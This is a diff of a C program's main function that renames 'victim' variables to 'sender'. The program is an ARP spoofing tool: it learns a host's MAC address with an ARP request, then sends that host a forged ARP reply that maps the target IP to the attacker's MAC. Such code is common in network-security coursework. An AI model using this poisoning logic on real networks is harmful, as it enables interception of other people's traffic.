@@ -26,12 +26,12 @@ int main(int argc, char* argv[]) {
 	char my_ip_addr_str[IP_ADDR_BUF_SIZE];
 	char my_mac_addr_str[MAC_ADDR_BUF_SIZE];
 	char *ifname = NULL; //interface name
-	char *victim_ip_addr_str = NULL; //victim ip address string
+	char *sender_ip_addr_str = NULL; //sender ip address string
 	char *target_ip_addr_str = NULL;
-	u_char victim_mac_addr[6];
-	char victim_mac_addr_str[MAC_ADDR_BUF_SIZE];
+	u_char sender_mac_addr[6];
+	char sender_mac_addr_str[MAC_ADDR_BUF_SIZE];
 	if (argc < 4) {
-		fprintf(stderr, "Usage: %s [-options] [Interface name] [victim IP] [target IP]\n", argv[0]);
+		fprintf(stderr, "Usage: %s [-options] [Interface name] [sender IP] [target IP]\n", argv[0]);
 		fprintf(stderr, "\t[options]\n\t\t-v : verbose mode\n");
 		return EXIT_FAILURE;
 	}
@@ -45,8 +45,8 @@ int main(int argc, char* argv[]) {
 		} else {
 			if (ifname == NULL) {
 				ifname = argv[cnt];
-			} else if (victim_ip_addr_str == NULL) {
-				victim_ip_addr_str = argv[cnt];
+			} else if (sender_ip_addr_str == NULL) {
+				sender_ip_addr_str = argv[cnt];
 			} else {
 				target_ip_addr_str = argv[cnt];
 			}
@@ -55,7 +55,7 @@ int main(int argc, char* argv[]) {
 
 	if (opt_verbose) {
 		printf("ifname: %s\n", ifname);
-		printf("victim_ip_addr_str: %s\n", victim_ip_addr_str);
+		printf("sender_ip_addr_str: %s\n", sender_ip_addr_str);
 		printf("target_ip_addr_str: %s\n", target_ip_addr_str);
 	}
 
@@ -86,7 +86,7 @@ int main(int argc, char* argv[]) {
 	}
 
 	//send ARP Request
-	send_arp_packet(handle, my_mac_addr_str, NULL, my_ip_addr_str, victim_ip_addr_str, ARPOP_REQUEST);
+	send_arp_packet(handle, my_mac_addr_str, NULL, my_ip_addr_str, sender_ip_addr_str, ARPOP_REQUEST);
 	//recv ARP reply
 	while(1) {
 		int status = pcap_next_ex(handle, &header_ptr, &pkt_data);
@@ -117,24 +117,24 @@ int main(int argc, char* argv[]) {
 			continue;
 		}
 		for (int i=0; i < 6; i++) {
-			victim_mac_addr[i] = arp_hdr->arp_sha[i];
+			sender_mac_addr[i] = arp_hdr->arp_sha[i];
 		}
-		sprintf(victim_mac_addr_str, "%02X:%02X:%02X:%02X:%02X:%02X", victim_mac_addr[0], victim_mac_addr[1],
-		 victim_mac_addr[2],victim_mac_addr[3],victim_mac_addr[4],victim_mac_addr[5]);
+		sprintf(sender_mac_addr_str, "%02X:%02X:%02X:%02X:%02X:%02X", sender_mac_addr[0], sender_mac_addr[1],
+		 sender_mac_addr[2],sender_mac_addr[3],sender_mac_addr[4],sender_mac_addr[5]);
 		break;
 	}
 	//recv ARP reply
 
 	if (opt_verbose) {
-		printf("Victim Mac addr - ");
+		printf("sender Mac addr - ");
 		for (int i=0; i < 6; i++) {
-			printf("%02X", victim_mac_addr[i]);
+			printf("%02X", sender_mac_addr[i]);
 			if (i < 5) putchar(':');
 		}
 		putchar('\n');
 	}
 
-	send_arp_packet(handle, my_mac_addr_str, victim_mac_addr_str, target_ip_addr_str, victim_ip_addr_str, ARPOP_REPLY);
+	send_arp_packet(handle, my_mac_addr_str, sender_mac_addr_str, target_ip_addr_str, sender_ip_addr_str, ARPOP_REPLY);
 
 
 	pcap_close(handle);
